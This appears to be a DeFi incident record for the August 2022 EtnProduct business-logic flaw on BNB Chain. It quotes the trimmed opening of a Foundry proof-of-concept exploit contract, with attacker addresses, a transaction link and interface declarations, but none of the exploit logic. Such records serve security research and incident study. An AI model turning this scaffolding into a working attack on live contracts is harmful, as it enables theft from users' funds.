# [?] EtnProduct - Business Logic Flaw

## Summary
Severity: Unknown
Chain: BNB Chain
Component: EtnProduct
Published: 2022-08-04
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-08/EtnProduct_exp.sol
Type: defi-exploit-poc

## Details
```solidity
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~3074 USD
// TX : https://app.blocksec.com/explorer/tx/bsc/0x72321a3b50bb68ac3b46b0ab973b0e87b6c48ab73d23c4ba2cb73527f978d995
// Attacker : https://bscscan.com/address/0xde703797fe9219b0485fb31eda627aa182b1601e
// Attack Contract : https://bscscan.com/address/0x178bf96e303fb31aef1b586271a63acd33e4eaf7
// GUY : https://x.com/BeosinAlert/status/1555439220474642432

interface Etnshop {
    function invite(address to, uint256 commId) external;
    function mint(uint256 commId, string memory name, string memory logo) external returns (uint256);
}

interface Etnnft is IERC721 {
    function mintETN(string memory uri, string memory name, string memory cid) external payable;
}

interface EtnProduct {
    function newProduct(
        uint256 commId,
        uint256 shopId,
        uint256 price,
        string memory name,
        string memory video
    ) external;
}

interface Umarket {
    function saleU(
        uint256 _amount
    ) external;
}

contract Exploit is Test {
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-08/EtnProduct_exp.sol_
